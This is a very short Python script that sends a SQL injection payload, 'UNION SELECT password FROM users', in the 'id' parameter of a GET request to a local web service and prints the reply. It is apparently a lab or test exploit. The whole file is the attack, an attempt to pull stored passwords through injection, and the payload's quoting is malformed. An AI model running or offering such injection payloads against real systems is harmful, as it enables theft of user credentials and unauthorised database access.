import requests
from bs4 import BeautifulSoup

rule = {'id': "'2' 'UNION SELECT password FROM users"}

r = requests.get('http://0.0.0.0:5001/users', rule)

print(r.text)
